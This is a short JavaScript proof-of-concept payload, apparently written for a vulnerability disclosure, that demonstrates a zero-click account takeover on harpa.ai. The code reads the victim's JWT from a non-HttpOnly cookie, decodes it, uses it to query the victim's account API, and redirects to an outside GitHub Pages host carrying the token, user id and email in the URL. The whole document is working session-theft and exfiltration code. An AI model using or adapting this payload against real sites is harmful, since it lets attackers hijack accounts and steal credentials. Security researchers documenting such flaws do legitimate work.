// HARPA AI Zero-Click ATO - Payload Script
// This script executes in the context of harpa.ai origin
// It demonstrates the full account takeover chain

(async () => {
  const ATTACKER_PAGE = "https://dharani-dharan-11023.github.io/harpa-poc/exfil.html";

  // Step 1: Steal JWT from non-HttpOnly cookie
  const cookies = document.cookie;
  const jwtMatch = cookies.split(';').find(c => c.trim().startsWith('jwt='));

  if (!jwtMatch) {
    console.log("[!] No JWT cookie found - user not logged in");
    document.body.innerHTML = '<h1 style="color:red">PoC: No JWT found (user not logged in on harpa.ai)</h1>';
    return;
  }

  const jwt = jwtMatch.trim().split('=').slice(1).join('=');

  // Step 2: Decode JWT to show user info
  const payload = JSON.parse(atob(jwt.split('.')[1].replace(/-/g, '+').replace(/_/g, '/')));

  // Step 3: Use stolen JWT to access victim's account data via API
  let accountData = null;
  let email = "";
  try {
    const resp = await fetch("https://api.harpa.ai/api/v1/auth/account?withBalanceAggregated=true", {
      headers: {
        "Authorization": "Bearer " + jwt,
        "Content-Type": "application/json"
      }
    });
    accountData = await resp.json();
    email = accountData.email || "";
  } catch (e) {
    console.log("[!] Could not fetch account data:", e.message);
  }

  // Step 4: Exfiltrate - redirect to attacker's GitHub Pages with stolen data
  // In a real attack, this would be a fetch() to the attacker's server
  // Here we redirect to prove the data leaves harpa.ai to the attacker's domain
  const exfilUrl = ATTACKER_PAGE + "?jwt=" + encodeURIComponent(jwt)
    + "&uid=" + encodeURIComponent(payload.id)
    + "&email=" + encodeURIComponent(email);

  window.location = exfilUrl;
})();
